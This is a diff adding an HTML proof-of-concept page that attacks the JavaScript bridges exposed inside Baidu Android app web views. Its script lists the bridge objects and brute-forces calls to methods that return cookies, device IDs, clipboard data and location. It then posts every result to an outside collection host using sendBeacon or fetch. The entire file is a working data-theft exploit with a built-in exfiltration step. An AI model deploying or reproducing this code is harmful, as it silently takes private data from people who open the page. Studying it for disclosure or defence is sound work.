@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>JSB Diag PoC - bd6</title>
+<style>
+  body{font:14px/1.5 -apple-system,sans-serif;padding:14px;color:#222;word-break:break-all}
+  h1{font-size:16px;margin:0 0 10px}
+  pre{background:#f5f5f5;padding:10px;border-radius:6px;white-space:pre-wrap}
+  .ok{color:#0a0}.err{color:#c00}
+</style>
+</head>
+<body>
+<h1 id="t">JSB Diag - 等待…</h1>
+<pre id="p"></pre>
+
+<script>
+(function(){
+  var lines = [];
+  function log(s, cls){
+    lines.push((cls?'['+cls.toUpperCase()+'] ':'') + s);
+    document.getElementById('p').textContent = lines.join('\n');
+  }
+
+  // ---------- Step A: 列出 window 上所有 Bdbox / Search* 接口 ----------
+  log('=== Step A: 枚举 JS Bridge 注入对象 ===');
+  var keys = Object.getOwnPropertyNames(window).filter(function(k){
+    return /^(Bdbox|Search|GoBack|Wise|baidu|nuomi|swan)/i.test(k);
+  });
+  log('matched window keys (' + keys.length + '): ' + (keys.join(', ') || '(none)'));
+
+  // ---------- Step B: 对每个接口对象，dump 它的方法名 ----------
+  log('\n=== Step B: 反射每个接口的方法名 ===');
+  keys.forEach(function(k){
+    try {
+      var obj = window[k];
+      if (!obj) return;
+      var members = [];
+      for (var m in obj) {
+        try { members.push(m + ':' + (typeof obj[m])); } catch(e){}
+      }
+      log(k + ' (typeof=' + (typeof obj) + ')');
+      log('   members(' + members.length + '): ' + (members.join(' | ') || '(empty for-in, may be native)'));
+    } catch(e){
+      log(k + ' enumerate ERR: ' + e.message, 'err');
+    }
+  });
+
+  // ---------- Step C: 暴力探测 Bdbox_android_utils 常见方法名 ----------
+  log('\n=== Step C: 暴力探测常见方法名 ===');
+  var candidates = [
+    // 大小写各种变体（我们要找出真正存在的拼写）
+    'getcuid','getCuid','getCUID','getCUid','getCUID2','getuid',
+    'getZid','getZID','getzid',
+    'getDeviceInfo','getdeviceinfo','getDeviceID','getDeviceId',
+    'getAppVersionName','getappversionname','getAppVersion','getVersion',
+    'getNetType','getnettype','getNetworkType',
+    'getBaiduSearchCookies','getbaidusearchcookies','getBaiduCookies','getCookie',
+    'getOsBranch','getOSBranch','getOsVersion','getOSVersion',
+    'getModel','getmodel','getBrand','getbrand','getManufacturer',
+    'getScreenInfo','getscreeninfo','getResolution',
+    'getClipboardData','getclipboardData',
+    'getLocation','getlocation','getLocationInfo'
+  ];
+  var u = window.Bdbox_android_utils;
+  if (!u) {
+    log('Bdbox_android_utils NOT FOUND on window', 'err');
+  } else {
+    candidates.forEach(function(name){
+      try {
+        var f = u[name];
+        if (typeof f !== 'function') {
+          log('skip ' + name + ' (typeof=' + typeof f + ')');
+          return;
+        }
+        var v;
+        try { v = f.call(u); } catch(callErr){
+          log('CALL_ERR ' + name + ': ' + callErr.message, 'err');
+          return;
+        }
+        log('FOUND ' + name + '() = ' + JSON.stringify(v), 'ok');
+      } catch(e){
+        log('PROBE_ERR ' + name + ': ' + e.message, 'err');
+      }
+    });
+  }
+
+  // ---------- Step D: 同样探测 SearchBoxJavaBridge / Bdbox_android_jsbridge ----------
+  log('\n=== Step D: SearchBoxJavaBridge / Bdbox_android_jsbridge 探测 ===');
+  ['SearchBoxJavaBridge','Bdbox_android_jsbridge','Bdbox_android_account'].forEach(function(brk){
+    var o = window[brk];
+    if (!o) { log(brk + ' = MISSING'); return; }
+    log(brk + ' present, typeof=' + typeof o);
+    var collected = [];
+    for (var m in o) collected.push(m);
+    log('   keys: ' + (collected.join(', ') || '(empty)'));
+  });
+
+  // ---------- Step E: 把全部诊断结果 POST 到 HTTPS 回包点 ----------
+  // 注意: GitHub Pages 是 https, 必须用 https endpoint, 否则 mixed-content 被拦
+  // 你需要把下面 ENDPOINT 换成你自己的 https 接收点 (比如 https://webhook.site/<uuid>)
+  var ENDPOINT = 'http://wlnyampe.eyes.sh/REPLACE-ME';
+  try {
+    var blob = new Blob([lines.join('\n')], {type:'text/plain;charset=utf-8'});
+    if (navigator.sendBeacon) {
+      var ok = navigator.sendBeacon(ENDPOINT, blob);
+      log('\nsendBeacon -> ' + ENDPOINT + ' returned ' + ok);
+    } else {
+      fetch(ENDPOINT, {method:'POST',body:blob,mode:'no-cors'})
+        .then(function(){ log('fetch posted'); })
+        .catch(function(e){ log('fetch ERR: ' + e.message, 'err'); });
+    }
+  } catch(e){
+    log('beacon ERR: ' + e.message, 'err');
+  }
+
+  // ---------- 兜底: 把诊断结果塞进 document.title, ADB 端可 dumpsys window 抓出 ----------
+  document.title = 'JSB:' + (keys.length) + ':' + (keys.join(',').substr(0,80));
+  document.getElementById('t').textContent = '诊断完成 — 共 ' + keys.length + ' 个接口对象';
+})();
+</script>
+</body>
+</html>
